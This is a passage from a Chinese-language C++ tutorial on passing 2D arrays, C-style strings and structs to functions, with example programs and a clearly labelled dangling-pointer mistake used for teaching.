<code>arr[i][j]</code>，编译器需要计算其内存地址，公式通常类似于：<code>基地址 + (i * cols + j) * sizeof(元素类型)</code>。可以看到，计算地址需要知道 <code>cols</code>（列数）的值。如果函数不知道列数，就无法正确地进行指针运算来定位元素。</p><p><strong>示例：处理二维数组的函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> COLS = <span class="number">4</span>; <span class="comment">// 使用常量定义列数，方便维护</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：计算二维数组所有元素的和</span></span><br><span class="line"><span class="comment">// 参数：二维数组 (必须指定列数 COLS)，行数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_2d_array</span><span class="params">(<span class="keyword">int</span> arr[][COLS], <span class="keyword">int</span> rows)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：打印二维数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_2d_array</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> arr[][COLS], <span class="keyword">int</span> rows)</span></span>; <span class="comment">// 使用 const 防止修改</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> data[<span class="number">3</span>][COLS] = &#123;</span><br><span class="line">        &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;,</span><br><span class="line">        &#123;<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;,</span><br><span class="line">        &#123;<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> num_rows = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original 2D Array:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    print_2d_array(data, num_rows);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> total_sum = sum_2d_array(data, num_rows);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSum of all elements: &quot;</span> &lt;&lt; total_sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 78</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义：计算二维数组所有元素的和</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_2d_array</span><span class="params">(<span class="keyword">int</span> arr[][COLS], <span class="keyword">int</span> rows)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; COLS; ++j) &#123;</span><br><span class="line">            sum += arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义：打印二维数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_2d_array</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> arr[][COLS], <span class="keyword">int</span> rows)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; COLS; ++j) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; arr[i][j] &lt;&lt; <span class="string">&quot;\t&quot;</span>; <span class="comment">// 使用制表符分隔</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 每行结束后换行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 我们定义了一个全局常量 <code>COLS</code> 来表示数组的列数。这使得在函数原型和定义中指定列数更加方便和一致。</li><li> <code>sum_2d_array</code> 和 <code>print_2d_array</code> 函数的第一个参数都声明为 <code>int arr[][COLS]</code> 或 <code>const int arr[][COLS]</code>，明确指定了列的大小。</li><li> <code>main</code> 函数中定义了一个 3x4 的二维数组 <code>data</code>。</li><li> 调用函数时，传递数组名 <code>data</code>（它代表指向第一个包含 <code>COLS</code> 个 <code>int</code> 的一维数组的指针）和行数 <code>num_rows</code>。</li><li> 函数内部可以使用标准的 <code>arr[i][j]</code> 语法来访问数组元素，因为编译器知道列数 <code>COLS</code>，可以正确计算每个元素的地址。</li></ol><p><strong>总结:</strong></p><ul><li>  将二维（或更高维）数组传递给函数时，必须在函数参数中指定除第一维之外的所有维度的大小。</li><li>  这是因为函数需要这些维度信息来进行正确的指针运算以访问数组元素。</li><li>  通常将数组维度（尤其是除第一维外的维度）定义为常量，以提高代码的可读性和可维护性。</li><li>  与一维数组一样，函数操作的是原始数组，而不是副本（除非使用了 <code>const</code>，否则函数可以修改原始数组）。</li></ul><h2 id="7-5-函数和-C-风格字符串"><a href="#7-5-函数和-C-风格字符串" class="headerlink" title="7.5 函数和 C-风格字符串"></a>7.5 函数和 C-风格字符串</h2><p>C-风格字符串本质上是字符数组 (<code>char[]</code>)，其末尾有一个特殊的空字符 (<code>\0</code>) 来标记字符串的结束。因此，将 C-风格字符串传递给函数遵循与传递普通数组相同的规则：传递的是指向字符串第一个字符的指针 (<code>char*</code>)。</p><p>函数不需要单独的参数来指定字符串的长度，因为它可以遍历字符序列直到遇到空字符 <code>\0</code> 来确定字符串的结束。</p><h3 id="7-5-1-将-C-风格字符串作为参数的函数"><a href="#7-5-1-将-C-风格字符串作为参数的函数" class="headerlink" title="7.5.1 将 C-风格字符串作为参数的函数"></a>7.5.1 将 C-风格字符串作为参数的函数</h3><p>当函数接收 C-风格字符串作为参数时，通常使用 <code>char*</code> 或 <code>const char*</code> 类型。如果函数不打算修改字符串内容，强烈建议使用 <code>const char*</code>，这可以防止意外修改，并允许函数接受字符串字面值（它们是常量）和 <code>const</code> 字符数组作为参数。</p><p><strong>示例 1: 计算 C-风格字符串的长度</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：计算 C 风格字符串的长度</span></span><br><span class="line"><span class="comment">// 使用 const char* 因为我们不修改字符串</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">string_length</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 循环直到遇到空字符 &#x27;\0&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> (*str != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        length++;</span><br><span class="line">        str++; <span class="comment">// 移动指针到下一个字符</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> greeting[] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* message = <span class="string">&quot;World!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of \&quot;&quot;</span> &lt;&lt; greeting &lt;&lt; <span class="string">&quot;\&quot;: &quot;</span> &lt;&lt; string_length(greeting) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 5</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;: &quot;</span> &lt;&lt; string_length(message) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 输出: 6</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of \&quot;C++\&quot;: &quot;</span> &lt;&lt; string_length(<span class="string">&quot;C++&quot;</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;                 <span class="comment">// 输出: 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例 2: 打印 C-风格字符串</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：打印 C 风格字符串</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_string</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 可以直接使用 cout，它知道如何处理 char* 直到遇到 &#x27;\0&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; str;</span><br><span class="line">    <span class="comment">// 或者手动遍历</span></span><br><span class="line">    <span class="comment">// while (*str != &#x27;\0&#x27;) &#123;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; *str;</span></span><br><span class="line">    <span class="comment">//     str++;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[] = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span>;</span><br><span class="line">    print_string(name);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>重要注意事项:</strong></p><ul><li>  <strong>空字符终止:</strong> 处理 C-风格字符串的函数依赖于空字符 <code>\0</code> 来确定结束。如果传递的字符数组没有正确地以 <code>\0</code> 结尾，函数可能会读取超出数组边界的内存，导致未定义行为（通常是程序崩溃或数据损坏）。</li><li>  <strong>缓冲区溢出:</strong> 如果函数需要修改传入的字符串或将数据写入字符数组缓冲区（例如 <code>strcpy</code>, <code>strcat</code> 的自定义版本），必须确保操作不会超出缓冲区的分配大小，否则会发生缓冲区溢出，这是一个严重的安全漏洞。通常需要传递缓冲区的大小作为额外参数。</li><li>  <strong><code>const</code> 正确性:</strong> 明确使用 <code>const char*</code> 来表示函数不会修改输入字符串。</li></ul><h3 id="7-5-2-返回-C-风格字符串的函数"><a href="#7-5-2-返回-C-风格字符串的函数" class="headerlink" title="7.5.2 返回 C-风格字符串的函数"></a>7.5.2 返回 C-风格字符串的函数</h3><p>让函数返回一个 C-风格字符串（即 <code>char*</code>）比传递它要复杂得多，并且充满了潜在的陷阱。主要问题在于字符串数据存储在哪里以及其生命周期。</p><p><strong>常见的错误方式 (危险！):</strong></p><ol><li><strong>返回指向局部变量的指针:</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// !!! 错误且危险的示例 !!!</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">create_temp_string</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> temp[] = <span class="string">&quot;Temporary&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> temp; <span class="comment">// 错误！temp 是局部数组，函数返回后内存被释放</span></span><br><span class="line">                 <span class="comment">// 返回的指针将指向无效内存 (悬挂指针)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 调用 <code>create_temp_string()</code> 后得到的指针是无效的，解引用它会导致未定义行为。</li></ol><p><strong>可行的（但各有缺点）方式:</strong></p><ol><li><p><strong>返回指向静态局部变量的指针:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用静态局部变量</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">get_static_message</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> message[] = <span class="string">&quot;Static Message&quot;</span>;</span><br><span class="line">    <span class="comment">// message 在程序整个生命周期内存在，但只有一个实例</span></span><br><span class="line">    <span class="keyword">return</span> message;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* msg1 = get_static_message();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Msg1: &quot;</span> &lt;&lt; msg1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Static Message</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果函数被再次调用，它会返回指向 *同一个* 静态内存的指针</span></span><br><span class="line">    <span class="comment">// 如果函数内部修改了静态变量，所有之前的指针都会看到变化</span></span><br><span class="line">    <span class="comment">// 这种方式不是线程安全的</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* msg2 = get_static_message();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Msg2: &quot;</span> &lt;&lt; msg2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Static Message</span></span><br><span class="line">    <span class="comment">// msg1 和 msg2 指向同一块内存</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>缺点:</strong> 返回的指针指向的内存在后续调用中可能被覆盖（如果函数修改静态变量的话），并且这种方法不是线程安全的。</p></li><li><p><strong>返回指向动态分配内存的指针 (<code>new</code>):</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // 为了 strcpy</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回动态分配的内存</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">create_dynamic_string</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* initial_value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* dynamic_str = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(initial_value) + <span class="number">1</span>]; <span class="comment">// 分配内存 (+1 for &#x27;\0&#x27;)</span></span><br><span class="line">    <span class="built_in">strcpy</span>(dynamic_str, initial_value); <span class="comment">// 复制内容</span></span><br><span class="line">    <span class="keyword">return</span> dynamic_str; <span class="comment">// 返回指向新分配内存的指针</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* str1 = create_dynamic_string(<span class="string">&quot;Dynamic Data&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic String 1: &quot;</span> &lt;&lt; str1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// !!! 重要：调用者必须负责释放内存 !!!</span></span><br><span class="line">    <span class="keyword">delete</span>[] str1;</span><br><span class="line">    str1 = <span class="literal">nullptr</span>; <span class="comment">// 好习惯：释放后置空指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* str2 = create_dynamic_string(<span class="string">&quot;More Data&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic String 2: &quot;</span> &lt;&lt; str2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] str2;</span><br><span class="line">    str2 = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>缺点:</strong> 调用者必须记住使用 <code>delete[]</code> 来释放返回的指针所指向的内存，否则会导致内存泄漏。这种责任转移很容易出错。</p></li><li><p><strong>传递由调用者分配的缓冲区 (推荐方式):</strong><br> 这是最安全、最常用的方法。函数接受一个指向调用者提供的缓冲区的指针和该缓冲区的大小，然后将结果字符串写入该缓冲区。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // 为了 strncpy</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数将结果写入调用者提供的缓冲区</span></span><br><span class="line"><span class="comment">// 返回值可以指示成功/失败或写入的字符数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">format_greeting</span><span class="params">(<span class="keyword">char</span> buffer[], <span class="keyword">size_t</span> buffer_size, <span class="keyword">const</span> <span class="keyword">char</span>* name)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 snprintf 或其他安全函数来防止缓冲区溢出</span></span><br><span class="line">    <span class="keyword">int</span> written = <span class="built_in">snprintf</span>(buffer, buffer_size, <span class="string">&quot;Hello, %s!&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否成功且未截断 (snprintf 返回值特性)</span></span><br><span class="line">    <span class="keyword">if</span> (written &gt; <span class="number">0</span> &amp;&amp; written &lt; buffer_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 成功</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 可能缓冲区太小或发生错误</span></span><br><span class="line">        <span class="keyword">if</span> (buffer_size &gt; <span class="number">0</span>) buffer[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">// 确保缓冲区为空字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 失败</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> BUF_SIZE = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">char</span> my_buffer[BUF_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (format_greeting(my_buffer, BUF_SIZE, <span class="string">&quot;Alice&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Formatted Greeting: &quot;</span> &lt;&lt; my_buffer &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Hello, Alice!</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to format greeting (buffer too small?)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (format_greeting(my_buffer, <span class="number">10</span>, <span class="string">&quot;Bob The Builder&quot;</span>)) &#123; <span class="comment">// 尝试用小缓冲区</span></span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Formatted Greeting: &quot;</span> &lt;&lt; my_buffer &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to format greeting (buffer too small?)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 这将被打印</span></span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Buffer content after fail: \&quot;&quot;</span> &lt;&lt; my_buffer &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: &quot;&quot; (因为函数清空了)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>优点:</strong> 内存管理由调用者负责，函数本身不分配内存，避免了内存泄漏和悬挂指针的风险。函数接口清晰地表明了其对缓冲区的需求。</p></li></ol><p><strong>总结:</strong></p><ul><li>  将 C-风格字符串作为参数传递给函数时，传递的是 <code>char*</code>，函数依赖 <code>\0</code> 确定结束，使用 <code>const char*</code> 防止意外修改。</li><li>  让函数返回 C-风格字符串 (<code>char*</code>) 比较棘手。返回指向局部变量的指针是错误的。返回静态变量指针有局限性。返回动态分配内存 (<code>new</code>) 要求调用者管理内存 (<code>delete[]</code>)。</li><li>  最安全、最推荐的方式是让调用者提供缓冲区，函数将结果写入该缓冲区，并通常传递缓冲区大小以防止溢出。</li><li>  在现代 C++ 中，通常更推荐使用 <code>std::string</code> 类来处理字符串，因为它会自动管理内存，避免了许多与 C-风格字符串相关的陷阱。</li></ul><h2 id="7-6-函数和结构"><a href="#7-6-函数和结构" class="headerlink" title="7.6 函数和结构"></a>7.6 函数和结构</h2><p>结构 (struct) 是一种用户定义的复合类型，可以将不同类型的数据项组合成一个单一的实体。与基本数据类型一样，结构也可以作为参数传递给函数，并且函数也可以返回结构类型的值。</p><h3 id="7-6-1-传递和返回结构"><a href="#7-6-1-传递和返回结构" class="headerlink" title="7.6.1 传递和返回结构"></a>7.6.1 传递和返回结构</h3><p>默认情况下，结构与基本数据类型（如 <code>int</code>, <code>double</code>）一样，是<strong>按值传递 (Pass by Value)</strong> 给函数的。这意味着当将一个结构变量作为实参传递给函数时，函数会创建该结构的一个完整<strong>副本</strong>（形参），并在函数内部操作这个副本。对副本成员的任何修改都不会影响原始结构变量。</p><p>同样，函数也可以声明一个结构类型作为其<strong>返回类型</strong>。当函数返回一个结构时，它会创建一个该结构的临时副本，并将其返回给调用者。</p><p><strong>示例：按值传递和返回结构</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 使用 string 类成员</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个简单的结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> 